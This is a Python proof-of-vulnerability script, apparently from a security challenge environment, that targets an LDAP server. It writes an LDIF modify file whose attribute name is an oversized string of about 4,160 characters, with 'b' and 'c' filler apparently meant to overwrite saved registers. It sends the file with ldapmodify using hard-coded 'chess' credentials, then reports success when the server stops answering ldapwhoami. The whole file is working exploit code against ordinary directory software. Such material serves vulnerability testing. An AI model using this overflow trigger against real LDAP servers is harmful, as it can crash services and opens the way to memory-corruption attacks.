import sys
import socket
import random
import time
import string
import base64
import os
import string
import struct
import signal
import subprocess

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(1)

def drop_ldif_file(nm):

    baddy = 'a'*4144
    baddy += 'b'*8
    baddy += 'c'* 8

    data = 'dn: cn=Hawaii John,ou=People,dc=chess,dc=com\n'
    data += 'changeType: modify\n'
    data += 'add: ' + baddy + '\n'
    data += baddy + ': helloworld\n'

    f = open(nm, 'w')
    f.write(data)
    f.close()

    return nm


def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        TOOLS = sys.argv[2]
    else:
        if 'HOST' in os.environ and 'TOOLS' in os.environ:
            HOST = os.environ['HOST']
            TOOLS = os.environ['TOOLS']
        else:
            print('[ERROR] HOST and TOOLS must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(20)
    
    ldif = drop_ldif_file(b'/tmp/mod.ldif')

    args = [TOOLS + 'ldapmodify', '-h', HOST, '-D', 'uid=chess,ou=people,dc=chess,dc=com', '-w', 'chess', '-f', ldif ]

    res = subprocess.run( args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    args = [TOOLS + 'ldapwhoami', '-h', HOST, '-x', '-D', 'uid=chess,ou=people,dc=chess,dc=com', '-w', 'chess' ]
    
    res = subprocess.run( args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if res.stdout.find(b'chess') != -1:
        print('[FAIL] POV failed')
        exit(1)
    else:
        print('[RSP]=0x6363636363636363')
        print('R15=0x6262626262626262')
        print('[SUCCESS?] POV completed successfully')
        exit(0)

    

    

if __name__ == '__main__':
    main()
